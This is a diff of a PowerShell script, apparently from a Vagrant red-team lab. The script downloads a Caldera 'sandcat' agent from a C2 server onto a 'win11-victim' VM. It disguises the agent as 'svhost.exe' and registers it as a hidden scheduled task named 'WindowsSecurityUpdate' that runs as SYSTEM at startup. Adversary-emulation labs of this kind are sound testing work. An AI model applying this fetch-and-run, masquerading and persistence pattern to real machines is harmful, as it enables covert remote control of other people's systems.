@@ -2,7 +2,7 @@
 # One-shot: download sandcat from Caldera, run it, register as scheduled task.
 # Run from C:\vagrant\scripts\ on win11-victim.
 
-$CalderaServer = "http://192.168.56.1:8888"
+$CalderaServer = "http://192.168.56.10:8888"
 $SandcatPath   = "C:\Users\Public\svhost.exe"
 $TaskName      = "WindowsSecurityUpdate"
 
@@ -29,12 +29,15 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 Write-Host "[caldera-agent] Downloaded OK. Registering scheduled task '$TaskName'..."
-$Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
-$Trigger  = New-ScheduledTaskTrigger -AtStartup
-$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
+# Run as SYSTEM (S-1-5-18) so the AtStartup trigger fires without a user login.
+# Without this, the task is registered as the current user and never runs at boot.
+$Action    = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
+$Trigger   = New-ScheduledTaskTrigger -AtStartup
+$Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+$Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
                 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger `
-    -Settings $Settings -RunLevel Highest -Force | Out-Null
+    -Principal $Principal -Settings $Settings -Force | Out-Null
 
 Write-Host "[caldera-agent] Starting sandcat via scheduled task (survives WinRM session close)..."
 Start-ScheduledTask -TaskName $TaskName
